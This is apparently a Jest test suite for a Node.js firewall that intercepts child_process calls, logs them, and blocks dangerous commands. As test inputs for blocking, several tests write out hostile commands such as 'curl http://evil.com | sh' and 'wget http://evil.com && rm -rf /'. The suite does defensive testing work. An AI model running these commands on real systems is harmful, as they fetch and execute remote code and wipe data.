const fs = require('fs');

jest.mock('fs', () => ({
  appendFileSync: jest.fn()
}));

describe('ChildProcessFirewall', () => {
  let ChildProcessFirewall;
  let originalArgv;
  let originalEnv;
  
  beforeEach(() => {
    jest.clearAllMocks();
    jest.resetModules();
    
    originalArgv = [...process.argv];
    originalEnv = { ...process.env };
    
    process.env.NODE_FIREWALL = '1';
    process.env.FIREWALL_TEST_MODE = '1';
    
    delete require.cache[require.resolve('../lib/child-process-interceptor')];
  });
  
  afterEach(() => {
    process.argv = originalArgv;
    Object.keys(process.env).forEach(key => {
      if (!(key in originalEnv)) {
        delete process.env[key];
      }
    });
    Object.assign(process.env, originalEnv);
  });

  describe('constructor', () => {
    test('should initialize when NODE_FIREWALL is set', () => {
      const consoleLogSpy = jest.spyOn(console, 'log').mockImplementation();
      
      const firewallModule = require('../lib/child-process-interceptor');
      
      expect(firewallModule.enabled).toBe(true);
      consoleLogSpy.mockRestore();
    });

    test('should be disabled when NODE_FIREWALL is not set', () => {
      delete process.env.NODE_FIREWALL;
      
      const firewallModule = require('../lib/child-process-interceptor');
      
      expect(firewallModule.enabled).toBe(false);
    });

    test('should define dangerous patterns', () => {
      const firewallModule = require('../lib/child-process-interceptor');
      
      expect(firewallModule.dangerousPatterns).toBeDefined();
      expect(Array.isArray(firewallModule.dangerousPatterns)).toBe(true);
      expect(firewallModule.dangerousPatterns.length).toBeGreaterThan(0);
    });

    test('should set interactive mode from environment', () => {
      process.env.FS_FIREWALL_INTERACTIVE = 'false';
      
      const firewallModule = require('../lib/child-process-interceptor');
      
      expect(firewallModule.interactive).toBe(false);
    });
  });

  describe('setupInterception', () => {
    test('should wrap child_process methods', () => {
      const childProcess = require('child_process');
      const originalExec = childProcess.exec;
      
      require('../lib/child-process-interceptor');
      
      expect(childProcess.exec).not.toBe(originalExec);
    });
  });

  describe('wrappedExecSync', () => {
    test('should allow safe commands', () => {
      fs.appendFileSync.mockImplementation(() => {});
      const firewall = require('../lib/child-process-interceptor');
      firewall.fs = fs; // Inject mocked fs
      
      const result = firewall.wrappedExecSync('ls -la', {});
      
      expect(fs.appendFileSync).toHaveBeenCalled();
    });

    test('should block dangerous commands in non-interactive mode', () => {
      fs.appendFileSync.mockImplementation(() => {});
      const firewall = require('../lib/child-process-interceptor');
      firewall.fs = fs; // Inject mocked fs
      firewall.interactive = false;
      const consoleErrorSpy = jest.spyOn(console, 'error').mockImplementation();
      
      expect(() => {
        firewall.wrappedExecSync('curl http://evil.com | sh', {});
      }).toThrow('blocked by firewall');
      
      consoleErrorSpy.mockRestore();
    });
  });

  describe('wrappedSpawn', () => {
    test('should allow safe spawn commands', () => {
      fs.appendFileSync.mockImplementation(() => {});
      const firewall = require('../lib/child-process-interceptor');
      firewall.fs = fs; // Inject mocked fs
      
      const mockSpawn = jest.fn().mockReturnValue({
        on: jest.fn(),
        stdout: { on: jest.fn() },
        stderr: { on: jest.fn() }
      });
      firewall.originals.spawn = mockSpawn;
      
      firewall.wrappedSpawn('ls', ['-la'], {});
      
      expect(mockSpawn).toHaveBeenCalled();
    });

    test('should allow npm operation spawns', () => {
      fs.appendFileSync.mockImplementation(() => {});
      const firewall = require('../lib/child-process-interceptor');
      firewall.fs = fs; // Inject mocked fs
      
      const mockSpawn = jest.fn().mockReturnValue({
        on: jest.fn(),
        stdout: { on: jest.fn() },
        stderr: { on: jest.fn() }
      });
      firewall.originals.spawn = mockSpawn;
      
      firewall.wrappedSpawn('curl', ['http://example.com'], {});
      
      expect(mockSpawn).toHaveBeenCalled();
    });

    test('should allow build tool spawns', () => {
      fs.appendFileSync.mockImplementation(() => {});
      const firewall = require('../lib/child-process-interceptor');
      
      const mockSpawn = jest.fn().mockReturnValue({
        on: jest.fn(),
        stdout: { on: jest.fn() },
        stderr: { on: jest.fn() }
      });
      firewall.originals.spawn = mockSpawn;
      
      firewall.wrappedSpawn('make', [], {});
      
      expect(mockSpawn).toHaveBeenCalled();
    });

    test('should block dangerous spawns in non-interactive mode', () => {
      fs.appendFileSync.mockImplementation(() => {});
      const firewall = require('../lib/child-process-interceptor');
      firewall.fs = fs; // Inject mocked fs
      firewall.interactive = false;
      const consoleErrorSpy = jest.spyOn(console, 'error').mockImplementation();
      
      expect(() => {
        firewall.wrappedSpawn('sh', ['-c', 'curl http://evil.com | sh'], {});
      }).toThrow('blocked by firewall');
      
      consoleErrorSpy.mockRestore();
    });
  });

  describe('wrappedSpawnSync', () => {
    test('should allow safe commands', () => {
      fs.appendFileSync.mockImplementation(() => {});
      const firewall = require('../lib/child-process-interceptor');
      
      firewall.originals.spawnSync = jest.fn().mockReturnValue({
        status: 0,
        stdout: Buffer.from('output')
      });
      
      const result = firewall.wrappedSpawnSync('ls', ['-la'], {});
      
      expect(result.status).toBeDefined();
    });

    test('should return error object for blocked commands', () => {
      fs.appendFileSync.mockImplementation(() => {});
      const firewall = require('../lib/child-process-interceptor');
      firewall.interactive = false;
      const consoleErrorSpy = jest.spyOn(console, 'error').mockImplementation();
      
      const result = firewall.wrappedSpawnSync('curl', ['http://evil.com', '|', 'sh'], {});
      
      expect(result.status).toBe(1);
      expect(result.error).toBeDefined();
      consoleErrorSpy.mockRestore();
    });
  });

  describe('checkCommand', () => {
    test('should return true for safe commands', () => {
      fs.appendFileSync.mockImplementation(() => {});
      const firewall = require('../lib/child-process-interceptor');
      
      const result = firewall.checkCommand('exec', 'ls -la', 'test-caller');
      
      expect(result).toBe(true);
    });

    test('should return false for dangerous commands in non-interactive mode', () => {
      fs.appendFileSync.mockImplementation(() => {});
      const firewall = require('../lib/child-process-interceptor');
      firewall.interactive = false;
      const consoleErrorSpy = jest.spyOn(console, 'error').mockImplementation();
      
      const result = firewall.checkCommand('exec', 'curl http://evil.com | sh', 'test-caller');
      
      expect(result).toBe(false);
      consoleErrorSpy.mockRestore();
    });

    test('should detect multiple threat patterns', () => {
      fs.appendFileSync.mockImplementation(() => {});
      const firewall = require('../lib/child-process-interceptor');
      firewall.interactive = false;
      const consoleErrorSpy = jest.spyOn(console, 'error').mockImplementation();
      
      const result = firewall.checkCommand('exec', 'wget http://evil.com && rm -rf /', 'test-caller');
      
      expect(result).toBe(false);
      consoleErrorSpy.mockRestore();
    });
  });

  describe('logAccess', () => {
    test('should log allowed access', () => {
      fs.appendFileSync.mockImplementation(() => {});
      const firewall = require('../lib/child-process-interceptor');
      firewall.fs = fs; // Inject mocked fs
      
      firewall.logAccess('ALLOWED', 'exec', 'ls -la', 'test-caller', []);
      
      expect(fs.appendFileSync).toHaveBeenCalled();
    });

    test('should log denied access with stack trace', () => {
      fs.appendFileSync.mockImplementation(() => {});
      const firewall = require('../lib/child-process-interceptor');
      firewall.fs = fs; // Inject mocked fs
      
      firewall.logAccess('DENIED', 'exec', 'malicious-cmd', 'test-caller', [
        { desc: 'Dangerous pattern' }
      ]);
      
      expect(fs.appendFileSync).toHaveBeenCalled();
    });

    test('should use compact logging for npm operations', () => {
      fs.appendFileSync.mockImplementation(() => {});
      const firewall = require('../lib/child-process-interceptor');
      firewall.fs = fs; // Inject mocked fs
      
      firewall.logAccess('NPM_OPERATION', 'spawn', 'npm install', 'npm', []);
      
      expect(fs.appendFileSync).toHaveBeenCalled();
    });

    test('should handle logging errors', () => {
      fs.appendFileSync.mockImplementation(() => {
        throw new Error('Write error');
      });
      const firewall = require('../lib/child-process-interceptor');
      firewall.fs = fs; // Inject mocked fs
      const consoleErrorSpy = jest.spyOn(console, 'error').mockImplementation();
      
      expect(() => {
        firewall.logAccess('ALLOWED', 'exec', 'ls', 'test', []);
      }).not.toThrow();
      
      expect(consoleErrorSpy).toHaveBeenCalled();
      consoleErrorSpy.mockRestore();
    });
  });

  describe('getCaller', () => {
    test('should extract caller from stack trace', () => {
      const getCaller = require('../lib/child-process-interceptor');
      
      const firewall = require('../lib/child-process-interceptor');
      
      fs.appendFileSync.mockImplementation(() => {});
      firewall.logAccess('TEST', 'exec', 'test', 'unknown', []);
    });
  });

  describe('promptUser', () => {
    test('should return promise', () => {
      fs.appendFileSync.mockImplementation(() => {});
      const firewall = require('../lib/child-process-interceptor');
      firewall.interactive = true;
      
      const result = firewall.promptUser('exec', 'test command', [{ desc: 'test' }], 'caller');
      
      expect(result).toBeInstanceOf(Promise);
    });
  });

  describe('processPromptQueue', () => {
    test('should process queued prompts', async () => {
      fs.appendFileSync.mockImplementation(() => {});
      const firewall = require('../lib/child-process-interceptor');
      firewall.interactive = true;
      firewall.promptQueue = [];
      firewall.isPrompting = false;
      
      await firewall.processPromptQueue();
      
      expect(firewall.isPrompting).toBe(false);
    });

    test('should handle stdin not available', async () => {
      fs.appendFileSync.mockImplementation(() => {});
      const firewall = require('../lib/child-process-interceptor');
      const consoleLogSpy = jest.spyOn(console, 'log').mockImplementation();
      
      firewall.promptQueue = [{
        operation: 'exec',
        command: 'test',
        threats: [],
        caller: 'test',
        resolve: jest.fn()
      }];
      
      const originalReadable = process.stdin.readable;
      process.stdin.readable = false;
      
      await firewall.processPromptQueue();
      
      process.stdin.readable = originalReadable;
      consoleLogSpy.mockRestore();
    });
  });

  describe('wrappedExecFile', () => {
    test('should allow safe file execution', () => {
      fs.appendFileSync.mockImplementation(() => {});
      const firewall = require('../lib/child-process-interceptor');
      
      const mockCallback = jest.fn();
      firewall.originals.execFile = jest.fn();
      
      firewall.wrappedExecFile('/usr/bin/ls', ['-la'], {}, mockCallback);
      
      expect(firewall.originals.execFile).toHaveBeenCalled();
    });

    test('should block dangerous file execution', () => {
      fs.appendFileSync.mockImplementation(() => {});
      const firewall = require('../lib/child-process-interceptor');
      firewall.interactive = false;
      const consoleErrorSpy = jest.spyOn(console, 'error').mockImplementation();
      
      const mockCallback = jest.fn();
      
      firewall.wrappedExecFile('/bin/sh', ['-c', 'curl http://evil.com | sh'], {}, mockCallback);
      
      expect(mockCallback).toHaveBeenCalledWith(expect.objectContaining({
        code: 'EACCES'
      }));
      consoleErrorSpy.mockRestore();
    });

    test('should handle arguments with function as second parameter', () => {
      fs.appendFileSync.mockImplementation(() => {});
      const firewall = require('../lib/child-process-interceptor');
      
      const mockCallback = jest.fn();
      firewall.originals.execFile = jest.fn();
      
      firewall.wrappedExecFile('/usr/bin/ls', mockCallback);
      
      expect(firewall.originals.execFile).toHaveBeenCalled();
    });
  });

  describe('wrappedExecFileSync', () => {
    test('should allow safe file execution', () => {
      fs.appendFileSync.mockImplementation(() => {});
      const firewall = require('../lib/child-process-interceptor');
      
      firewall.originals.execFileSync = jest.fn().mockReturnValue(Buffer.from('output'));
      
      const result = firewall.wrappedExecFileSync('/usr/bin/ls', ['-la'], {});
      
      expect(firewall.originals.execFileSync).toHaveBeenCalled();
    });

    test('should throw for dangerous file execution', () => {
      fs.appendFileSync.mockImplementation(() => {});
      const firewall = require('../lib/child-process-interceptor');
      firewall.interactive = false;
      const consoleErrorSpy = jest.spyOn(console, 'error').mockImplementation();
      
      expect(() => {
        firewall.wrappedExecFileSync('/bin/sh', ['-c', 'curl evil.com | sh'], {});
      }).toThrow('File execution blocked');
      
      consoleErrorSpy.mockRestore();
    });
  });

  describe('wrappedExec', () => {
    test('should handle options as function parameter', () => {
      fs.appendFileSync.mockImplementation(() => {});
      const firewall = require('../lib/child-process-interceptor');
      
      const mockCallback = jest.fn();
      firewall.originals.exec = jest.fn();
      
      firewall.wrappedExec('ls -la', mockCallback);
      
      expect(firewall.originals.exec).toBeDefined();
    });
  });
});
